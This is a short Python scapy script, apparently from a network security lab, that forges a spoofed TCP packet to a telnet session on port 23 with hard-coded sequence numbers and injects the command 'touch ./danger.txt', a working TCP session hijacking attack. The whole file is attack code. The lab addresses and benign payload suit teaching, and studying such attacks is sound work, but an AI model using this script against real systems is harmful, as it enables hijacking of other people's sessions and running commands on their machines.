#!/usr/bin/env python3
from scapy.all import *

ip = IP(src="10.9.0.6", dst="10.9.0.5")
tcp = TCP(sport=57328, dport=23, flags="A", seq=1960804135, ack=1174207624)
data = "touch ./danger.txt\r"
pkt = ip/tcp/data
ls(pkt)
send(pkt, verbose=0)